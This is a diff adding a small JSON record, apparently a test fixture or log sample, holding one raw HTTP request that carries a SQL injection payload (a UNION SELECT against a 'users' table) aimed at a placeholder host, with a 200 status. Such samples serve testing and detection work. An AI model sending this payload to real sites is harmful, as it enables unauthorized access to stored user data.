@@ -1,0 +1,4 @@
+{
+  "request": "GET /index.php?id=1' UNION SELECT * FROM users-- HTTP/1.1\r\nHost: vulnerablesite.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
+  "response_status": 200
+}
